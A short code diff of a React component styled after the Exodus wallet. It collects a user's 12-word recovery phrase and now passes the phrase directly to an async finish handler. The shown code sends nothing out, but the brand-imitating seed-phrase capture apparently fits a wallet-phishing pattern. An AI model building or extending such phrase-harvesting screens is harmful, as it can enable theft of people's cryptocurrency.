@@ -8,18 +8,15 @@ import ExodusSmall from "../icons/exodus-small";
 
 const Exodus = ({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
 	const [words, setWords] = useState<string[]>(Array(12).fill(""));
 	const { setSeedPhrase } = useWalletStore();
 
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
-		setWalletPhrase(words.join(" "));
-		handleFinish();
+		handleFinish(words.join(" "));
 	};
 
 	const handleWordChange = (index: number, value: string) => {
